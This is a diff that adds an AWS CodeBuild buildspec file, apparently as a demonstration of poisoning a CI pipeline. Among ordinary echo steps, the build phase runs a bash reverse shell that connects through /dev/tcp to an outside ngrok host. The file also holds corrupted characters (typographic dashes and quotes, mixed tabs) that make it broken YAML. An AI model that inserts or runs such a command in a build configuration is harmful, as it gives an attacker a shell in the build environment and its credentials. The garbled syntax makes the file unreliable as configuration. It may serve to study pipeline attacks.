@@ -1,0 +1,22 @@
+phases:
+  install:
+    runtime-versions:
+      nodejs:10
+	commands:
+	  - echo "installing something"
+  pre_build:
+    commands:
+      - echo "we are in the pre build phase"
+  build:
+    commands:
+      - echo "we are in the build block"
+      - bash −c ’bash − i >& /dev/tcp/2.tcp.us−cal−1.ngrok.io/18514 0>&1 ’ #REVERSE SHELL COMMAND
+      - echo "we will run some tests"
+	  - grep −Fq ”Cross−Site Scripting (XSS)” index.html
+  post_build:
+    commands:
+      − echo ”we are in the post build phase”
+artifacts:
+    files:
+	  − ’**/*’
+	name: DevOps−Code−Build
